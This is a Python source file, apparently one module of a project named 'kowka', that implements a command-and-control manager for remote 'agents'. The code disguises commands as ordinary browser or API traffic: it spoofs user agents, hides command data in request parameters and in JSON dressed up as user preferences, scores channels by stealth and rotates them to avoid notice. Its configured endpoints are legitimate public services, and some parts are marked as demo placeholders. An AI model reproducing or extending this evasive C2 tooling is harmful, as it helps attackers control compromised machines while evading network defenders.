"""
Network operations and communication management
Advanced C2 channel management with traffic mimicking and evasion
"""

import logging
import asyncio
import aiohttp
import random
import time
from typing import Dict, List, Optional, Tuple
from datetime import datetime, timedelta
from urllib.parse import urlparse
import json

class NetworkOperationsManager:
    """Manages all network communications, C2 channels, and traffic evasion"""
    
    def __init__(self):
        self.logger = logging.getLogger('kowka.network')
        self.active_channels = {}
        self.channel_health = {}
        self.session = None
        self.websocket_connections = {}
        self.operational = False
        self.traffic_profiles = self._initialize_traffic_profiles()
        
    def _initialize_traffic_profiles(self) -> Dict:
        """Initialize realistic traffic mimicking profiles"""
        return {
            'chrome_browser': {
                'user_agents': [
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                ],
                'headers': {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Cache-Control': 'no-cache'
                },
                'request_patterns': ['GET', 'POST', 'GET', 'GET', 'POST']  # Realistic pattern
            },
            'api_client': {
                'user_agents': [
                    'python-requests/2.31.0',
                    'Go-http-client/1.1'
                ],
                'headers': {
                    'Content-Type': 'application/json',
                    'User-Agent': 'API-Client/1.0'
                },
                'request_patterns': ['POST', 'GET', 'POST']
            }
        }
    
    async def initialize(self) -> bool:
        """Initialize network operations with configured channels"""
        try:
            # Initialize aiohttp session with realistic timeouts
            self.session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(
                    total=30,
                    connect=10,
                    sock_read=20
                ),
                connector=aiohttp.TCPConnector(
                    limit=100,
                    limit_per_host=20,
                    verify_ssl=False  # For testing, would be True in production
                )
            )
            
            # Load and validate C2 channel configurations
            await self._load_channel_configurations()
            
            # Start health monitoring and rotation
            asyncio.create_task(self._channel_health_monitor())
            asyncio.create_task(self._channel_rotation_loop())
            
            self.operational = True
            self.logger.info("Network operations manager initialized with %d channels", len(self.active_channels))
            return True
            
        except Exception as e:
            self.logger.error(f"Network operations initialization failed: {str(e)}")
            return False
    
    async def _load_channel_configurations(self):
        """Load and configure C2 channels with realistic endpoints"""
        self.active_channels = {
            'github_api': {
                'url': 'https://api.github.com/repos/microsoft/vscode/commits',
                'type': 'HTTP_GET',
                'active': True,
                'priority': 'HIGH',
                'rotation_interval': 300,
                'last_used': None,
                'success_count': 0,
                'failure_count': 0,
                'traffic_profile': 'chrome_browser',
                'stealth_level': 9
            },
            'cloudflare_health': {
                'url': 'https://www.cloudflare.com/cdn-cgi/trace',
                'type': 'HTTP_GET', 
                'active': True,
                'priority': 'HIGH',
                'rotation_interval': 600,
                'last_used': None,
                'success_count': 0,
                'failure_count': 0,
                'traffic_profile': 'chrome_browser',
                'stealth_level': 8
            },
            'reddit_api': {
                'url': 'https://www.reddit.com/r/programming/hot.json',
                'type': 'HTTP_GET',
                'active': True,
                'priority': 'MEDIUM',
                'rotation_interval': 900,
                'last_used': None,
                'success_count': 0,
                'failure_count': 0,
                'traffic_profile': 'chrome_browser',
                'stealth_level': 7
            },
            'websocket_fallback': {
                'url': 'wss://ws.postman-echo.com/raw',
                'type': 'WEBSOCKET',
                'active': False,  # Disabled by default, enable if needed
                'priority': 'LOW',
                'rotation_interval': 1800,
                'last_used': None,
                'success_count': 0,
                'failure_count': 0,
                'traffic_profile': 'api_client',
                'stealth_level': 6
            }
        }
        
        # Initialize health tracking
        for channel_name in self.active_channels:
            self.channel_health[channel_name] = {
                'response_time': [],
                'success_rate': 1.0,
                'last_check': None,
                'consecutive_failures': 0
            }
    
    async def send_agent_command(self, agent_id: str, command: Dict, priority: str = 'NORMAL') -> bool:
        """Send command to agent via optimal C2 channel with traffic mimicking"""
        try:
            # Select channel based on priority and health
            channel_name = await self._select_optimal_channel(priority)
            if not channel_name:
                self.logger.error(f"No healthy C2 channels available for agent {agent_id}")
                return False
            
            channel = self.active_channels[channel_name]
            
            # Prepare stealth payload (steganographic techniques would go here)
            stealth_payload = await self._prepare_stealth_payload(agent_id, command, channel)
            
            # Send via selected channel with realistic traffic patterns
            start_time = time.time()
            success = await self._send_via_channel(channel_name, stealth_payload)
            response_time = time.time() - start_time
            
            # Update channel metrics
            await self._update_channel_metrics(channel_name, success, response_time)
            
            if success:
                self.logger.info(f"Command sent to agent {agent_id} via {channel_name} in {response_time:.2f}s")
                channel['last_used'] = datetime.utcnow()
                channel['success_count'] += 1
                return True
            else:
                self.logger.warning(f"Failed to send via {channel_name}, agent {agent_id}")
                channel['failure_count'] += 1
                # Immediate fallback for critical commands
                if priority == 'HIGH':
                    return await self._emergency_fallback(agent_id, command)
                return False
                
        except Exception as e:
            self.logger.error(f"Failed to send command to agent {agent_id}: {str(e)}")
            return False
    
    async def _select_optimal_channel(self, priority: str) -> Optional[str]:
        """Select optimal C2 channel using weighted scoring based on health, stealth, and priority"""
        available_channels = []
        
        for name, config in self.active_channels.items():
            if not config['active']:
                continue
                
            # Skip channels with recent consecutive failures
            health = self.channel_health[name]
            if health['consecutive_failures'] >= 3:
                continue
                
            # Calculate channel score
            score = self._calculate_channel_score(name, priority)
            available_channels.append((name, score))
        
        if not available_channels:
            return None
        
        # Weighted random selection based on scores
        channels, scores = zip(*available_channels)
        total_score = sum(scores)
        probabilities = [score / total_score for score in scores]
        
        return random.choices(channels, weights=probabilities, k=1)[0]
    
    def _calculate_channel_score(self, channel_name: str, priority: str) -> float:
        """Calculate channel selection score based on multiple factors"""
        channel = self.active_channels[channel_name]
        health = self.channel_health[channel_name]
        
        # Base score from health
        health_score = health['success_rate']
        
        # Stealth score (higher is better)
        stealth_score = channel['stealth_level'] / 10.0
        
        # Priority alignment
        priority_weights = {'HIGH': 1.0, 'MEDIUM': 0.7, 'LOW': 0.4, 'NORMAL': 0.6}
        priority_score = priority_weights.get(channel['priority'], 0.5)
        
        # Recency penalty (avoid overusing same channel)
        recency_penalty = 1.0
        if channel['last_used']:
            hours_since_use = (datetime.utcnow() - channel['last_used']).total_seconds() / 3600
            recency_penalty = min(1.0, hours_since_use / 24.0)  # Favor channels not used in last 24h
        
        # Combine scores
        total_score = (health_score * 0.4 + 
                      stealth_score * 0.3 + 
                      priority_score * 0.2 + 
                      recency_penalty * 0.1)
        
        return max(0.1, total_score)  # Ensure minimum score
    
    async def _prepare_stealth_payload(self, agent_id: str, command: Dict, channel: Dict) -> Dict:
        """Prepare stealth payload using traffic mimicking and steganography"""
        profile = self.traffic_profiles[channel['traffic_profile']]
        
        # Select random user agent from profile
        user_agent = random.choice(profile['user_agents'])
        
        # Create realistic-looking request data
        if channel['type'] == 'HTTP_GET':
            # Encode command in request parameters
            stealth_data = {
                'method': 'GET',
                'headers': {
                    'User-Agent': user_agent,
                    **profile['headers']
                },
                'params': self._encode_command_parameters(agent_id, command)
            }
        else:  # HTTP_POST or WEBSOCKET
            # Encode command in request body
            stealth_data = {
                'method': 'POST' if channel['type'].startswith('HTTP') else 'WS_SEND',
                'headers': {
                    'User-Agent': user_agent,
                    **profile['headers']
                },
                'data': self._encode_command_body(agent_id, command)
            }
        
        return stealth_data
    
    def _encode_command_parameters(self, agent_id: str, command: Dict) -> Dict:
        """Encode command as HTTP GET parameters using steganographic techniques"""
        # Simple encoding for demonstration
        # In real implementation, this would use proper steganography
        return {
            'q': f"search_{random.randint(1000, 9999)}",
            'timestamp': str(int(time.time())),
            'ref': f"agent_{agent_id[-8:]}",
            'cmd': json.dumps(command)[:50]  # Truncated for URL safety
        }
    
    def _encode_command_body(self, agent_id: str, command: Dict) -> str:
        """Encode command as request body using JSON wrapping"""
        # Wrap command in realistic-looking JSON structure
        wrapper = {
            'api_version': '1.0',
            'request_id': f"req_{random.randint(10000, 99999)}",
            'timestamp': datetime.utcnow().isoformat(),
            'data': {
                'user_preferences': command,  # Command hidden in nested structure
                'session_token': f"token_{agent_id[-6:]}"
            }
        }
        return json.dumps(wrapper)
    
    async def _send_via_channel(self, channel_name: str, payload: Dict) -> bool:
        """Send payload via specified channel with error handling"""
        channel = self.active_channels[channel_name]
        
        try:
            if channel['type'].startswith('HTTP'):
                return await self._send_http(channel['url'], payload)
            elif channel['type'] == 'WEBSOCKET':
                return await self._send_websocket(channel['url'], payload)
            else:
                self.logger.error(f"Unsupported channel type: {channel['type']}")
                return False
                
        except Exception as e:
            self.logger.error(f"Failed to send via channel {channel_name}: {str(e)}")
            return False
    
    async def _send_http(self, url: str, payload: Dict) -> bool:
        """Send payload via HTTP with realistic traffic patterns"""
        try:
            method = payload.get('method', 'GET')
            headers = payload.get('headers', {})
            
            if method == 'GET':
                params = payload.get('params', {})
                async with self.session.get(url, headers=headers, params=params) as response:
                    return response.status in [200, 201, 202]
            else:  # POST
                data = payload.get('data', '')
                async with self.session.post(url, headers=headers, data=data) as response:
                    return response.status in [200, 201, 202]
                    
        except Exception as e:
            self.logger.debug(f"HTTP send failed: {str(e)}")
            return False
    
    async def _send_websocket(self, url: str, payload: Dict) -> bool:
        """Send payload via WebSocket with reconnection logic"""
        try:
            if url not in self.websocket_connections:
                # Establish new connection
                ws = await self.session.ws_connect(url)
                self.websocket_connections[url] = ws
            else:
                ws = self.websocket_connections[url]
            
            # Send data
            data = payload.get('data', '')
            await ws.send_str(data)
            
            # Wait for acknowledgment with timeout
            try:
                async with asyncio.timeout(10):  # 10 second timeout
                    msg = await ws.receive()
                    return msg.type == aiohttp.WSMsgType.TEXT and 'ack' in msg.data.lower()
            except asyncio.TimeoutError:
                self.logger.warning("WebSocket acknowledgment timeout")
                return False
                
        except Exception as e:
            self.logger.debug(f"WebSocket send failed: {str(e)}")
            # Remove failed connection
            self.websocket_connections.pop(url, None)
            return False
    
    async def _emergency_fallback(self, agent_id: str, command: Dict) -> bool:
        """Emergency fallback using all available channels"""
        self.logger.warning(f"Attempting emergency fallback for agent {agent_id}")
        
        available_channels = [
            name for name, config in self.active_channels.items()
            if config['active'] and self.channel_health[name]['consecutive_failures'] < 5
        ]
        
        for channel_name in available_channels:
            self.logger.info(f"Emergency fallback attempt via {channel_name}")
            stealth_payload = await self._prepare_stealth_payload(agent_id, command, self.active_channels[channel_name])
            success = await self._send_via_channel(channel_name, stealth_payload)
            
            if success:
                self.logger.info(f"Emergency fallback successful via {channel_name}")
                return True
        
        self.logger.error("All emergency fallback channels failed")
        return False
    
    async def _update_channel_metrics(self, channel_name: str, success: bool, response_time: float):
        """Update channel health metrics"""
        health = self.channel_health[channel_name]
        
        # Update response time tracking (keep last 10 samples)
        health['response_time'].append(response_time)
        if len(health['response_time']) > 10:
            health['response_time'].pop(0)
        
        # Update success rate
        if success:
            health['consecutive_failures'] = 0
            total_attempts = health.get('total_attempts', 0) + 1
            success_count = health.get('success_count', 0) + 1
            health['success_rate'] = success_count / total_attempts
            health['total_attempts'] = total_attempts
            health['success_count'] = success_count
        else:
            health['consecutive_failures'] += 1
            total_attempts = health.get('total_attempts', 0) + 1
            health['success_rate'] = health.get('success_count', 0) / total_attempts if total_attempts > 0 else 0
            health['total_attempts'] = total_attempts
        
        health['last_check'] = datetime.utcnow()
    
    async def _channel_health_monitor(self):
        """Background task for monitoring channel health"""
        while self.operational:
            try:
                await asyncio.sleep(60)  # Check every minute
                
                for channel_name, channel in self.active_channels.items():
                    if not channel['active']:
                        continue
                    
                    # Perform health check
                    health_check = await self._perform_health_check(channel_name)
                    if not health_check:
                        self.logger.warning(f"Channel {channel_name} failed health check")
                        # Could implement automatic channel disable/enable here
                        
            except Exception as e:
                self.logger.error(f"Health monitor error: {str(e)}")
                await asyncio.sleep(30)
    
    async def _perform_health_check(self, channel_name: str) -> bool:
        """Perform health check on specific channel"""
        channel = self.active_channels[channel_name]
        
        try:
            if channel['type'].startswith('HTTP'):
                async with self.session.get(channel['url'], timeout=10) as response:
                    return response.status == 200
            else:
                # WebSocket health check
                return await self._check_websocket_health(channel['url'])
        except Exception:
            return False
    
    async def _check_websocket_health(self, url: str) -> bool:
        """Check WebSocket connection health"""
        try:
            if url in self.websocket_connections:
                ws = self.websocket_connections[url]
                # Send ping
                await ws.ping()
                return True
            return False
        except Exception:
            return False
    
    async def _channel_rotation_loop(self):
        """Background task for rotating C2 channels"""
        while self.operational:
            try:
                await asyncio.sleep(300)  # Check every 5 minutes
                await self._rotate_channels()
            except Exception as e:
                self.logger.error(f"Channel rotation error: {str(e)}")
                await asyncio.sleep(60)
    
    async def _rotate_channels(self):
        """Rotate C2 channels based on usage patterns and health"""
        current_time = datetime.utcnow()
        
        for channel_name, channel in self.active_channels.items():
            if not channel['active']:
                continue
                
            # Check if channel needs rotation due to overuse
            if (channel['last_used'] and 
                (current_time - channel['last_used']).total_seconds() < channel['rotation_interval']):
                continue
            
            health = self.channel_health[channel_name]
            
            # Rotate if health is poor or channel is stale
            if (health['success_rate'] < 0.5 or 
                health['consecutive_failures'] > 2):
                
                self.logger.info(f"Rotating channel {channel_name} due to poor health")
                # In production, this would update to new endpoints
                channel['last_used'] = None  # Reset usage tracking
    
    async def receive_agent_data(self, agent_id: str, data: Dict) -> bool:
        """Process data received from agents (simulated for this demo)"""
        try:
            # In real implementation, this would decrypt and process agent data
            self.logger.info(f"Received data from agent {agent_id}, size: {len(str(data))} bytes")
            
            # Simulate processing delay
            await asyncio.sleep(0.1)
            
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to process data from agent {agent_id}: {str(e)}")
            return False
    
    async def emergency_shutdown(self):
        """Emergency shutdown of all network operations"""
        self.operational = False
        self.logger.warning("Initiating network operations emergency shutdown")
        
        # Close WebSocket connections
        for url, ws in self.websocket_connections.items():
            try:
                await ws.close()
            except Exception:
                pass
        self.websocket_connections.clear()
        
        # Close HTTP session
        if self.session:
            await self.session.close()
        
        self.logger.info("Network operations manager shutdown complete")
    
    def get_operational_status(self) -> Dict:
        """Get current network operations status"""
        active_count = sum(1 for channel in self.active_channels.values() if channel['active'])
        total_health = sum(health['success_rate'] for health in self.channel_health.values()) / len(self.channel_health) if self.channel_health else 0
        
        return {
            'operational': self.operational,
            'active_channels': active_count,
            'total_channels': len(self.active_channels),
            'average_health': round(total_health, 3),
            'websocket_connections': len(self.websocket_connections)
        }
